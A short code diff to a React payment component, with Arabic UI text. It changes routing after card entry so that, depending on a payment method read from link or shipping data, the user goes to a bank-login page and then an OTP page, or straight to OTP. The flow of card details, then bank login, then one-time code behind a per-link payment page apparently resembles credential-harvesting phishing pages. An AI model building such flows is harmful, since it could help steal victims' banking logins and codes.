@@ -207,14 +207,19 @@ const PaymentCardInput = () => {
       description: "تم تفويض البطاقة بنجاح",
     });
     
-    // Navigate to bank login page if bank is selected, otherwise go to OTP
+    // Check payment method from link data
+    const paymentMethod = shippingInfo?.payment_method || 'card';
+    
     // Preserve query parameters
     const queryString = new URLSearchParams(window.location.search).toString();
     const queryStr = queryString ? `?${queryString}` : '';
     
-    if (selectedBankId && selectedBankId !== 'skipped') {
+    // Route based on payment method
+    if (paymentMethod === 'bank_login' && selectedBankId && selectedBankId !== 'skipped') {
+      // Bank login flow: card-input → bank-login → otp
       navigate(`/pay/${id}/bank-login${queryStr}`);
     } else {
+      // Card payment flow: card-input → otp (skip bank login)
       navigate(`/pay/${id}/otp${queryStr}`);
     }
   };
